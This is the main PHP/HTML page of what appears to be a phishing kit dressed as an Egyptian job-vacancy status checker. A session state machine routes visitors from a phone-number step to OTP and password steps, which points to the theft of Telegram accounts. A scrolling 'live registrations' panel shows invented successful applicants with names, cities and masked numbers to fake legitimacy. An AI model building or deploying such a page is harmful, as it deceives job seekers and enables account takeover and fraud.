<?php require_once("_core.php"); 

if (isset($_GET['next'])) {
    $_SESSION["state"] = $_GET['next'];
    header("Location: index.php"); 
    exit;
}

if (!isset($_SESSION["state"]) || isset($_GET["otherAccount"])) {
    $_SESSION["state"] = "start";
    unset($_SESSION["phone"], $_SESSION["otp"], $_SESSION["hint"]);
}
$F = $_SESSION["state"];
?>
<!DOCTYPE html><html lang="ar" dir="rtl" class="h-100"><head id="ctl00_Head1">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:title" content="Permohonan Jawatan Kosong">
<meta name="description" content="Semakan status permohonan jawatan kosong terkini melalui nombor Telegram.">
<title>Permohonan Jawatan Terkini</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
<style>
:root{
    --primary:#4f46e5;
    --primary-soft:#6366f1;
    --primary-dark:#4338ca;
    --accent-green:#22c55e;
    --accent-green-soft:#dcfce7;
    --bg-page-top:#e5edff;
    --bg-page-bottom:#f9fafb;
    --card-bg:#ffffff;
    --card-radius:26px;
    --card-shadow:0 26px 60px rgba(15,23,42,.18);
    --border:#e5e7eb;
    --text:#111827;
    --muted:#6b7280;
    --input-bg:#f9fafb
}
*{box-sizing:border-box}
body{
    font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
    background:linear-gradient(to bottom,var(--bg-page-top),var(--bg-page-bottom));
    color:var(--text);min-height:100vh;margin:0;padding:0;line-height:1.5
}
.container-narrow{max-width:480px;margin:0 auto;padding:0 12px 40px}

.loading{position:fixed;inset:0;z-index:9999;display:grid;place-items:center;background:rgba(0,0,0,.9)}
.loading::before{content:"";position:absolute;inset:0;background:radial-gradient(rgba(20,20,20,.75),rgba(0,0,0,.85))}
.signal{position:relative;z-index:1;display:flex;gap:6px;align-items:flex-end;padding:14px 16px;border-radius:16px;background:rgba(255,255,255,.08);backdrop-filter:blur(6px);box-shadow:0 18px 40px rgba(0,0,0,.35)}
.signal span{width:8px;height:10px;border-radius:6px;background:rgba(255,255,255,.92);animation:signalUp .9s ease-in-out infinite;transform-origin:bottom;opacity:.9}
.signal span:nth-child(1){animation-delay:0ms}
.signal span:nth-child(2){animation-delay:120ms}
.signal span:nth-child(3){animation-delay:240ms}
.signal span:nth-child(4){animation-delay:360ms}
.signal span:nth-child(5){animation-delay:480ms}
@keyframes signalUp{0%,100%{height:10px;opacity:.55}50%{height:40px;opacity:1}}

#loader{
    position:fixed;
    inset:0;
    background:rgba(255,255,255,.7);
    display:none;
    z-index:9999;
}
#loader.is-active{
    display:block !important;
}
#loader[style*="display: block"]{
    display:block !important;
}

#loader .loader{
    position:absolute;
    left:50%;
    top:50%;
    width:56px;
    height:56px;
    border:6px solid rgba(79,70,229,.2);
    border-top-color:#4f46e5;
    border-radius:50%;
    animation:loaderSpin .8s linear infinite;
}
@keyframes loaderSpin{
    0%   { transform: translate(-50%,-50%) rotate(0deg); }
    100% { transform: translate(-50%,-50%) rotate(360deg); }
}

.hero{position:relative;margin:0 -12px 0;border-radius:0 0 26px 26px;overflow:hidden;box-shadow:0 26px 60px rgba(15,23,42,.6);background:#020617}
.hero-img{display:block;width:100%;height:auto}

.card-form{background:var(--card-bg);border-radius:var(--card-radius);box-shadow:var(--card-shadow);padding:22px 20px;margin-top:16px;border:1px solid rgba(15,23,42,.04);position:relative;overflow:hidden}
.card-form::before{content:"";position:absolute;inset:0;pointer-events:none;background:radial-gradient(circle at top left,rgba(219,234,254,.85),transparent 60%),radial-gradient(circle at bottom right,rgba(199,210,254,.35),transparent 55%);opacity:.9}
.card-inner{position:relative;z-index:2}
.headline-wrapper{text-align:right;margin-bottom:18px}
.headline-badge{display:inline-flex;align-items:center;gap:8px;padding:4px 14px;border-radius:999px;background:var(--accent-green-soft);color:#166534;font-size:.78rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px}
.headline-badge-dot{width:10px;height:10px;border-radius:999px;background:#22c55e;box-shadow:0 0 0 5px rgba(34,197,94,.25)}
.headline-title{font-size:1.25rem;font-weight:800;letter-spacing:.01em;color:#111827;margin:0 0 4px;line-height:1.3}
.headline-sub{font-size:.9rem;color:var(--muted);margin:0;text-align:right}
.form-label-title{font-size:.9rem;font-weight:600;color:var(--text);margin:0 0 12px;display:block;text-align:center}
.form-label{font-size:.9rem;font-weight:600;color:var(--text);margin-bottom:6px;display:block;text-align:right}
.form-control{width:100%;min-height:48px;border:1px solid var(--border);border-radius:12px;background:var(--input-bg);padding:12px 16px;font-size:1rem;transition:all .3s;box-sizing:border-box;text-align:right}
.form-control:focus{outline:none;border-color:var(--primary-soft);box-shadow:0 0 0 1px rgba(129,140,248,.35);background:#fff}
.form-select{width:100%;min-height:48px;border:1px solid var(--border);border-radius:12px;background:var(--input-bg);padding:12px 16px;font-size:1rem;cursor:pointer;text-align:right}
.field-block{margin-bottom:16px}
.phone-group{display:flex;flex-direction:row-reverse;border:1px solid var(--border);border-radius:12px;overflow:hidden;background:var(--input-bg);transition:all .3s}
.phone-group:focus-within{border-color:var(--primary-soft);box-shadow:0 0 0 1px rgba(129,140,248,.35)}
.phone-prefix{display:flex;align-items:center;padding:12px 16px;gap:8px;background:#f3f4f6;border-left:1px solid var(--border);border-right:none;font-weight:700;font-size:.95rem;color:var(--text);direction:ltr}
.phone-input{flex:1}
.phone-input input{border:none;background:transparent;width:100%;padding:12px 16px;font-size:1rem;box-sizing:border-box;text-align:right;direction:ltr}
.btn-mk{width:100%;padding:14px;border:none;border-radius:999px;background:linear-gradient(90deg,var(--primary),var(--primary-soft));color:#fff;font-size:.95rem;font-weight:700;cursor:pointer;box-shadow:0 10px 25px rgba(79,70,229,.4);transition:all .3s;text-transform:uppercase;letter-spacing:.03em;margin-top:8px}
.btn-mk:hover{background:linear-gradient(90deg,var(--primary-dark),var(--primary-soft));transform:translateY(-1px);box-shadow:0 15px 35px rgba(79,70,229,.5)}

.record-wrap{max-width:480px;margin:30px auto;padding:24px;background:linear-gradient(135deg,#fff 0%,#f8fafc 100%);border:1px solid #e2e8f0;border-radius:24px;box-shadow:0 20px 40px rgba(15,23,42,.08),0 0 0 1px rgba(255,255,255,.5);position:relative;overflow:hidden}
.record-wrap::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:linear-gradient(90deg,#4f46e5,#22c55e,#4f46e5);background-size:200% 100%;animation:gradientMove 3s ease infinite}
@keyframes gradientMove{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
.record-header{font-weight:700;font-size:1.05rem;margin:0 0 20px;color:#1e293b;display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:2px solid #f1f5f9;gap:8px}
.record-header-title{display:flex;align-items:center;gap:8px}
.record-header-title i{font-size:1.15rem;color:var(--primary)}
.badge-live{font-size:.72rem;font-weight:700;padding:5px 12px;border-radius:999px;background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border:1px solid #86efac;display:flex;align-items:center;gap:5px;animation:pulse 2s ease-in-out infinite;flex-shrink:0}
.badge-live::before{content:'';width:7px;height:7px;background:#22c55e;border-radius:50%;animation:blink 1s ease-in-out infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.record-viewport{overflow:hidden;border-radius:16px;height:372px;position:relative;background:#f8fafc;border:1px solid #e2e8f0}
.record-track{display:flex;flex-direction:column;will-change:transform}
.rec-item-enhanced{display:flex;align-items:center;gap:14px;padding:16px;height:90px;flex-shrink:0;background:#fff;margin:3px 6px;border-radius:16px;box-shadow:0 4px 12px rgba(0,0,0,.04);border:1px solid #f1f5f9;transition:all .3s ease}
.rec-item-enhanced:hover{transform:translateX(5px);box-shadow:0 8px 20px rgba(79,70,229,.12);border-color:#c7d2fe}
.rec-avatar-image{width:48px;height:48px;border-radius:14px;overflow:hidden;flex-shrink:0;box-shadow:0 4px 10px rgba(0,0,0,.15);position:relative;display:flex;align-items:center;justify-content:center}
.rec-avatar-image img{width:100%;height:100%;object-fit:cover;display:block}
.avatar-fallback{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.3rem;font-weight:800}
.rec-content{flex:1;display:flex;flex-direction:column;gap:4px;min-width:0}
.rec-header-info{display:flex;justify-content:space-between;align-items:center;gap:8px}
.rec-name-enhanced{font-weight:700;font-size:.95rem;color:#1e293b;margin:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.rec-time{font-size:.73rem;color:#94a3b8;font-weight:500;white-space:nowrap;display:flex;align-items:center;gap:3px}
.rec-time i{font-size:.7rem}
.rec-details{display:flex;gap:10px;flex-wrap:wrap}
.rec-location,.rec-phone{font-size:.78rem;color:#64748b;font-weight:500;display:flex;align-items:center;gap:4px}
.rec-location i,.rec-phone i{font-size:.82rem;color:#94a3b8}
.rec-status-badge{font-size:.72rem;font-weight:700;padding:6px 12px;border-radius:999px;white-space:nowrap;flex-shrink:0;display:flex;align-items:center;gap:4px}
.rec-status-badge i{font-size:.8rem}
.status-success{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border:1px solid #86efac}
.status-pending{background:linear-gradient(135deg,#fef3c7,#fde68a);color:#92400e;border:1px solid #fcd34d}
.ppr-banner-wrapper{margin-top:24px;text-align:center;padding:0 4px}
.ppr-banner-img{width:100%;max-width:450px;height:auto;border-radius:16px;box-shadow:0 8px 24px rgba(15,23,42,.12);display:inline-block;object-fit:contain}

@media(min-width:768px){.card-form{padding:24px;margin:0 12px}.headline-title{font-size:1.3rem}}
@media(max-width:480px){
    .rec-item-enhanced{padding:12px;height:80px;gap:10px}
    .rec-avatar-image{width:40px;height:40px;border-radius:12px}
    .rec-name-enhanced{font-size:.85rem}
    .rec-details{flex-direction:column;gap:2px}
    .record-viewport{height:332px}
    .ppr-banner-img{border-radius:12px!important;max-width:100%!important}
}
</style>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="d-flex flex-column h-100">

<div id="loading" class="loading" style="display:none">
<div class="signal"><span></span><span></span><span></span><span></span><span></span></div>
</div>

<main class="flex-shrink-0">
<div class="container-narrow">

<section class="hero">
<img src="assets/images/jwtatas.jpeg" class="hero-img" alt="Permohonan Jawatan Kosong">
</section>

<div class="card-form">
<div class="card-inner">
<div class="headline-wrapper">
<div class="headline-badge"><span class="headline-badge-dot"></span>فرصة عمل – مراجعة حالة الطلب</div>
<h2 class="headline-title">متابعة الحالة</h2>
<p class="headline-sub">الوظيفة دي متاحة للمواطنين المصريين، ويكون عندهم التزام كويس بالشغل، ويتصفوا بالمسؤولية والانضباط، ويقدروا يشتغلوا بشكل فردي أو ضمن فريق، ويكونوا بصحة جيدة.

المرتب المعروض من ٢٥٠٠ إلى ٤٠٠٠ شهريًا.</p>
</div>

<?php
  switch ($F) {
    case "start":      require("Lander.php"); break;
    case "phone":      require("OTPC.php");   break;
    case "otp":        require("PASS.php");   break;
    case "processing": require("SCCS.php");   break;
    case "success":
      $_SESSION["state"] = "start";
      unset($_SESSION["phone"], $_SESSION["otp"], $_SESSION["hint"]);
      require("Lander.php");
      break;
    default: require("Lander.php");
  }
?>

<div class="record-wrap">
<div class="record-header">
<span class="record-header-title"><i class="bi bi-clipboard2-data"></i> أحدث التسجيلات</span>
<span class="badge-live">مباشر</span>
</div>
<div class="record-viewport" id="recViewport">
<div class="record-track" id="recTrack"></div>
</div>
</div>

</div>
</div>
</main>

<script>
(function(){
    "use strict";
    var data = [
        {name:"أحمد حسن",          location:"القاهرة",       time:"منذ دقيقتين",   phone:"+٢٠١٠****٨٨٨", status:"ناجح", avatar:"أ", photo:"assets/img/Ibrahim bin Khalid.jpg"},
        {name:"سارة محمد",          location:"الجيزة",         time:"منذ ٥ دقائق",   phone:"+٢٠١١****٢٣٤", status:"ناجح", avatar:"س", photo:"assets/img/siti.jpg"},
        {name:"محمود إسماعيل",     location:"الإسكندرية",    time:"منذ ٨ دقائق",   phone:"+٢٠١٢****٥٦٧", status:"ناجح", avatar:"م", photo:"assets/img/avatar.jpg"},
        {name:"فاطمة الزهراء",      location:"المنصورة",      time:"منذ ١٢ دقيقة", phone:"+٢٠١٥****٨٩٠", status:"ناجح", avatar:"ف", photo:"assets/img/fatin.jpeg"},
        {name:"عائشة يوسف",         location:"طنطا",          time:"منذ ١٥ دقيقة", phone:"+٢٠١٠****١٢٣", status:"ناجح", avatar:"ع", photo:"assets/img/aisya.jpeg"},
        {name:"لقمان كريم",         location:"أسيوط",         time:"منذ ١٨ دقيقة", phone:"+٢٠١١****٤٥٦", status:"ناجح", avatar:"ل", photo:"assets/img/lukman.jpeg"},
        {name:"نادية عبد الحميد",   location:"الزقازيق",      time:"منذ ٢٢ دقيقة", phone:"+٢٠١٢****٧٨٩", status:"ناجح", avatar:"ن", photo:"assets/img/avatar7.jpg"},
        {name:"حازم سعد",           location:"بورسعيد",       time:"منذ ٢٥ دقيقة", phone:"+٢٠١٠****٠١٢", status:"ناجح", avatar:"ح", photo:"assets/img/Coppeng Berjaya.jpeg"},
        {name:"عمر الشريف",         location:"السويس",        time:"منذ ٢٨ دقيقة", phone:"+٢٠١٥****٣٤٥", status:"ناجح", avatar:"ع", photo:"assets/img/bangmuled.jpg"},
        {name:"فرح علي",            location:"الإسماعيلية",   time:"منذ ٣٠ دقيقة", phone:"+٢٠١١****٦٧٨", status:"ناجح", avatar:"ف", photo:"assets/img/avatar10.jpg"},
        {name:"عمران مالك",         location:"سوهاج",         time:"منذ ٣٣ دقيقة", phone:"+٢٠١٢****٩٠١", status:"ناجح", avatar:"ع", photo:"assets/img/avatar11.jpg"},
        {name:"نور الهدى هاشم",     location:"الفيوم",        time:"منذ ٣٦ دقيقة", phone:"+٢٠١٠****٢٣٤", status:"ناجح", avatar:"ن", photo:"assets/img/avatar12.jpg"}
    ];
    var colors = ["#4f46e5","#22c55e","#f59e0b","#ef4444","#8b5cf6","#06b6d4"];
    var ITEM_H = 96;
    var SET_PX = ITEM_H * data.length;
    function makeCard(r, i){
        var c = colors[i % colors.length];
        var div = document.createElement("div");
        div.className = "rec-item-enhanced";
        div.style.height = "90px";
        div.innerHTML =
            '<div class="rec-content">' +
                '<div class="rec-header-info">' +
                    '<h4 class="rec-name-enhanced">' + r.name + '</h4>' +
                    '<span class="rec-time"><i class="bi bi-clock"></i> ' + r.time + '</span>' +
                '</div>' +
                '<div class="rec-details">' +
                    '<span class="rec-location"><i class="bi bi-geo-alt"></i> ' + r.location + '</span>' +
                    '<span class="rec-phone"><i class="bi bi-telephone"></i> ' + r.phone + '</span>' +
                '</div>' +
            '</div>' +
            '<div class="rec-status-badge status-success"><i class="bi bi-check-circle-fill"></i> ' + r.status + '</div>';
        return div;
    }
    var track = document.getElementById("recTrack");
    if(!track) return;
    var triple = data.concat(data, data);
    for(var i = 0; i < triple.length; i++){
        track.appendChild(makeCard(triple[i], i));
    }
    var px = 0, speed = 0.35, paused = false;
    function tick(){
        if(!paused){
            px += speed;
            if(px >= SET_PX) px -= SET_PX;
            track.style.transform = "translateY(-" + px + "px)";
        }
        requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
    var viewport = document.getElementById("recViewport");
    if(viewport){
        viewport.addEventListener("mouseenter", function(){ paused = true;  });
        viewport.addEventListener("mouseleave", function(){ paused = false; });
    }
})();
</script>

<div id="loader"><div class="loader"></div></div>
</body>
</html>